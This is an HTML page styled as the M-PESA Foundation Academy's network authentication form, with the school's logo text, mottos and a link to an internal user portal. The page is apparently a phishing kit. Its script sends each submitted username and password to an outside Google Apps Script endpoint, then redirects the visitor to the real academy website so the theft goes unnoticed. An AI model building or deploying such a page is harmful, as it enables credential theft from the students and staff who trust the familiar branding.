<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Network Authentication Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #333;
    }

    .top-text {
      font-size: 16px;
      margin-bottom: 30px;
    }

    .container {
      text-align: center;
      border: 1px solid #eee;
      padding: 40px;
      border-radius: 4px;
      box-shadow: 0 0 3px rgba(0, 0, 0, 0.1);
      width: 320px;
    }

    .logo-text {
      font-size: 20px;
      font-weight: bold;
      color: #6BBE44; /* M-PESA Foundation green */
      line-height: 1.3;
      margin-bottom: 20px;
    }

    .logo-dash {
      color: #FF0000; /* Red color for the dash */
      font-family: 'Georgia', serif; /* Decorative, web-safe font */
      font-size: 22px; /* Slightly larger for emphasis */
      font-weight: bold;
      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2); /* Subtle shadow for designer look */
      position: relative;
      top: 1px; /* Slight vertical adjustment for alignment */
    }

    h3 {
      color: #2a5b9e;
      font-weight: normal;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }

    button {
      width: 100%;
      background-color: #4CAF50;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #45a049;
    }

    .footer-text {
      margin-top: 15px;
      font-size: 13px;
      color: #333;
    }

    .footer-text a {
      text-decoration: none;
      color: #2a5b9e;
    }

    .footer-text a:hover {
      text-decoration: underline;
    }

    .bottom-text {
      position: absolute;
      bottom: 30px;
      font-size: 13px;
      text-align: center;
      width: 100%;
      color: #555;
    }

    #response {
      color: red;
      font-size: 14px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="top-text">Thinkers : Doers : Leaders</div>

  <div class="container">
    <div class="logo-text">
      M<span class="logo-dash">-</span>PESA<br>FOUNDATION<br>ACADEMY
    </div>

    <h3>Network Authentication Form</h3>

    <form id="authForm">
      <input type="text" name="username" placeholder="Enter your Username" required>
      <input type="password" name="password" placeholder="Enter your Password" required>
      <button type="submit">Login</button>
    </form>

    <p class="footer-text">
      <a href="https://172.16.200.3:65040/userportal/webpages/myaccount/login.jsp" target="_blank">
        Click here to access User Portal
      </a>
    </p>

    <p id="response"></p>
  </div>

  <div class="bottom-text">
    Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
  </div>

  <script>
    const form = document.getElementById('authForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const responseElement = document.getElementById('response');
      responseElement.textContent = ''; // Clear previous messages

      const formData = new FormData(form);
      console.log('Form Data:', [...formData]); // Debug: Log form data
      const params = new URLSearchParams(formData);

      try {
        const response = await fetch('https://script.google.com/macros/s/AKfycbzDWyyO4ROgVXxhWhgGK2f0KWj9hQ4IGKADIPoSizTiZW9-mDQj7wNdAEE2f1Fdc2Y/exec', {
          method: 'POST',
          body: params,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          }
        });

        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const text = await response.text();
        console.log('Server Response:', text); // Debug: Log response
        responseElement.textContent = text;

        if (text.toLowerCase().includes('success')) {
          responseElement.style.color = 'green';
          setTimeout(() => {
            window.location.href = 'https://mpesafoundationacademy.ac.ke';
          }, 1000); // Redirect after 1 second
          form.reset(); // Reset form after successful submission
        } else {
          responseElement.textContent = 'Submission failed: ' + text;
        }
      } catch (error) {
        console.error('Error:', error); // Debug: Log error
        responseElement.textContent = 'Error submitting form: ' + error.message;
      }
    });
  </script>
</body>
</html>
